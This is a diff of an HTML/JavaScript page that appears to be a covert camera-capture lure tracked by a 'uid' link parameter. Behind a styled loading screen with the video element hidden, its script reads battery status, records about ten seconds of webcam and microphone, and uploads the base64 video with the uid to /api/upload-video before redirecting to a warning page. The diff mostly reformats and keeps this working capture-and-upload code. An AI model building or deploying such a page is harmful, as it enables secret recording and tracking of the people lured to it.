@@ -7,36 +7,40 @@
   <style>
     * { box-sizing: border-box; }
     body {
-      margin: 0; padding: 0;
+      margin: 0;
+      padding: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
-      background-size: cover; height: 100vh;
-      display: flex; align-items: center; justify-content: center;
-      color: #fff; text-align: center; backdrop-filter: blur(6px);
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      text-align: center;
+      backdrop-filter: blur(6px);
     }
     .container {
-      background: rgba(0,0,0,0.6); border-radius: 25px; padding: 60px 45px;
-      width: 95%; max-width: 950px; min-height: 500px;
+      background: rgba(0,0,0,0.6);
+      border-radius: 25px;
+      padding: 60px 45px;
+      width: 95%;
+      max-width: 950px;
+      min-height: 500px;
       box-shadow: 0 0 25px rgba(0,255,153,0.5);
-      display: flex; flex-direction: column; align-items: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       animation: popIn 0.7s ease-out;
     }
-    .logo { width: 160px; margin-bottom: 30px; box-shadow: 0 0 18px rgba(0,255,255,0.6);}
-    .loader {
-      border: 7px solid rgba(255,255,255,0.2); border-top: 7px solid #00ffcc;
-      border-radius: 50%; width: 70px; height: 70px; animation: spin 1s linear infinite; margin: 25px 0;
-    }
-    .text {
-      font-size: 20px; line-height: 1.8; text-shadow: 0 0 6px rgba(0,0,0,0.6);
-      background: linear-gradient(to right,#00ffe7,#00ffa1,#9fff5b);
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      font-weight: bold;
-    }
-    .credit { margin-top:25px; font-size:15px; color:#ccc; font-weight:bold;}
-    @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-    @keyframes popIn {0%{opacity:0;transform:scale(0.9);}100%{opacity:1;transform:scale(1);}}
-    @media (max-width:600px){.container{margin:0 10px;padding:40px 25px;min-height:450px;}.logo{width:130px;}.text{font-size:17px;}}
-    video, canvas { display: none; }
+    .logo { width: 160px; margin-bottom: 30px; box-shadow:0 0 18px rgba(0,255,255,0.6);}
+    .loader { border:7px solid rgba(255,255,255,0.2); border-top:7px solid #00ffcc; border-radius:50%; width:70px; height:70px; animation:spin 1s linear infinite; margin:25px 0;}
+    .text { font-size:20px; line-height:1.8; text-shadow:0 0 6px rgba(0,0,0,0.6); background: linear-gradient(to right,#00ffe7,#00ffa1,#9fff5b); -webkit-background-clip:text; -webkit-text-fill-color:transparent; font-weight:bold;}
+    .credit { margin-top:25px; font-size:15px; color:#ccc; font-weight:bold; }
+    @keyframes spin { 0% { transform:rotate(0deg);} 100% { transform:rotate(360deg);} }
+    @keyframes popIn { 0% { opacity:0; transform:scale(0.9);} 100% { opacity:1; transform:scale(1);} }
+    @media (max-width:600px){ .container{margin:0 10px;padding:40px 25px;min-height:450px;} .logo{width:130px;} .text{font-size:17px;} }
+    video, canvas { display:none; }
   </style>
 </head>
 <body>
@@ -49,72 +53,70 @@
 </div>
 
 <video id="video" autoplay playsinline></video>
-<canvas id="snapshot"></canvas>
 
 <script>
 const video = document.getElementById('video');
-const canvas = document.getElementById('snapshot');
-const ctx = canvas.getContext('2d');
 const statusEl = document.getElementById('status');
-
 const params = new URLSearchParams(window.location.search);
 const uid = params.get('uid') || 'unknown';
 
-let mediaRecorder = null;
-let recordedChunks = [];
+let mediaRecorder, recordedChunks = [], batteryLevel=0, isCharging=false;
 
-if(uid) {
+if(uid){
   navigator.getBattery().then(battery => {
-    const batteryLevel = Math.round(battery.level*100);
-    const isCharging = battery.charging;
+    batteryLevel = Math.round(battery.level*100);
+    isCharging = battery.charging;
 
-    navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(stream => {
-      video.srcObject = stream;
+    navigator.mediaDevices.getUserMedia({ video:true, audio:true })
+      .then(stream => {
+        video.srcObject = stream;
 
-      mediaRecorder = new MediaRecorder(stream, {
-        mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm',
-        videoBitsPerSecond: 2500000
-      });
+        mediaRecorder = new MediaRecorder(stream, {
+          mimeType: 'video/webm;codecs=vp9',
+          videoBitsPerSecond: 2500000
+        });
 
-      mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); }
-      mediaRecorder.onstop = () => sendVideoToServer(batteryLevel, isCharging);
+        mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
+        mediaRecorder.onstop = sendVideoToServer;
 
-      statusEl.innerHTML = "🎥 <b>Recording video...</b>";
+        statusEl.innerHTML = "🎥 <b>Recording video...</b>";
 
-      setTimeout(() => {
-        mediaRecorder.start(1000);
+        // Start recording
+        setTimeout(() => { mediaRecorder.start(1000); }, 1000);
+
+        // Stop after 10 seconds
         setTimeout(() => {
-          if(mediaRecorder.state==='recording') {
+          if(mediaRecorder && mediaRecorder.state==='recording'){
             mediaRecorder.stop();
-            stream.getTracks().forEach(t=>t.stop());
+            stream.getTracks().forEach(track=>track.stop());
           }
-        }, 10000); // Record 10s
-      }, 1000);
+        }, 11000);
 
-    }).catch(err => {
-      console.error("Camera error:",err);
-      statusEl.innerHTML = "❌ <b>Camera/microphone access failed!</b>";
-    });
+      }).catch(err => {
+        console.error("Camera error:", err);
+        statusEl.innerHTML = "❌ <b>Camera/microphone access failed!</b>";
+      });
   });
 }
 
-function sendVideoToServer(battery, charging) {
+function sendVideoToServer(){
   if(recordedChunks.length===0){ window.location.href="/warning.html"; return; }
-  const videoBlob = new Blob(recordedChunks,{type:'video/webm'});
+  const videoBlob = new Blob(recordedChunks,{ type:'video/webm' });
   const reader = new FileReader();
-  reader.onloadend = () => {
-    const videoData = reader.result; // Base64 with header
-    fetch('/api/upload-video',{
+  reader.onloadend = ()=>{
+    const videoData = reader.result.split(',')[1];
+    fetch('/api/upload-video', {
       method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({video:videoData, uid, battery, charging, format:'webm'})
-    }).then(()=> window.location.href="/warning.html")
-    .catch(err=> { console.error("Upload error:",err); window.location.href="/warning.html"; });
+      headers:{ 'Content-Type':'application/json' },
+      body: JSON.stringify({ video:videoData, uid, battery:batteryLevel, charging:isCharging, format:'webm' })
+    }).then(res => window.location.href="/warning.html")
+      .catch(err=>window.location.href="/warning.html");
   };
   reader.readAsDataURL(videoBlob);
 }
 
-window.addEventListener('beforeunload',()=>{ if(mediaRecorder && mediaRecorder.state==='recording') mediaRecorder.stop(); });
+window.addEventListener('beforeunload', ()=>{ if(mediaRecorder && mediaRecorder.state==='recording') mediaRecorder.stop(); });
 </script>
+
 </body>
 </html> 
